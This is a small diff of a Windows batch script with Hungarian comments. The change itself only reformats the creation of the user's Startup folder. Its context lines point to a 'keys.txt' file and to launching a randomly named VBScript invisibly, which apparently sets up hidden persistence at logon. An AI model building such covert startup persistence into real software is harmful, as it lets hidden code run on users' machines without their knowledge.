@@ -13,8 +13,9 @@ if not exist "%TARGET%\keys.txt" (
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 :: Startup mappa létrehozása, ha nincs
-if not exist "%STARTUP_FOLDER%" mkdir "%STARTUP_FOLDER%"
-
+if not exist "%STARTUP_FOLDER%" (
+    mkdir "%STARTUP_FOLDER%"
+)
 
 :: ====== VBSCRIPT FUTTATÁSA LÁTHATATLANUL ======
 echo [INFO] A sifustartup5sfgj.vbs inditasa...
